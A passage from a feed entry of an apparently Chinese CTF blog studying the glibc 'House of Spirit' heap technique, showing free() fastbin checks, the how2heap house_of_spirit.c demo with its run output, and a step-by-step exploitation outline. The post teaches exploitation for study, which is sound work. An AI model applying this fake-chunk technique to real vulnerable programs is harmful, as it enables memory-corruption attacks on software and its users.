class="comment">/*其次，size的大小不能超过fastbin的最大值*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">       bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                         &gt;= av-&gt;system_mem, <span class="number">0</span>))                        <span class="comment">/*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*/</span></span><br><span class="line">      &#123;</span><br><span class="line">       errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">       <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p-&gt;fd = *fb;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里就直接以 how2heap 上的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c">house_of_spirit.c</a> 进行说明, 如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后的效果如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  pwner ./house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake <span class="string">&#x27;fastbin&#x27;</span> region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7fffffffdc08 and the second at 0x7fffffffdc48.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) <span class="keyword">while</span> still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free <span class="keyword">for</span> fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the malloc parameter at the end.</span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default <span class="keyword">for</span> the main arena) to pass the nextsize integrity checks. No need <span class="keyword">for</span> fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdc08.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will <span class="built_in">return</span> the region of our fake chunk at 0x7fffffffdc08, <span class="built_in">which</span> will be 0x7fffffffdc10!</span><br><span class="line">malloc(0x30): 0x7fffffffdc10</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>伪造堆块: 在可控的两个堆块构造好数据，将它伪造成一个fastbin</li><li>覆盖堆指针指向上一步伪造的堆块</li><li>释放堆块，将伪造的堆块释放入fastbin的单链表里面</li><li>申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的</li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><p>[l-ctf2016–pwn200]</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/">CTF Wiki Fastbin Attack</a></p><p><a href="https://www.anquanke.com/post/id/85357">【技术分享】堆之House of Spirit</a></p>]]></content>
    
    
    <summary type="html">House of Spirit 学习</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Pwn" scheme="http://lantern.cool/categories/Note/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://lantern.cool/tags/Pwn/"/>
    
  </entry>
  
</feed>
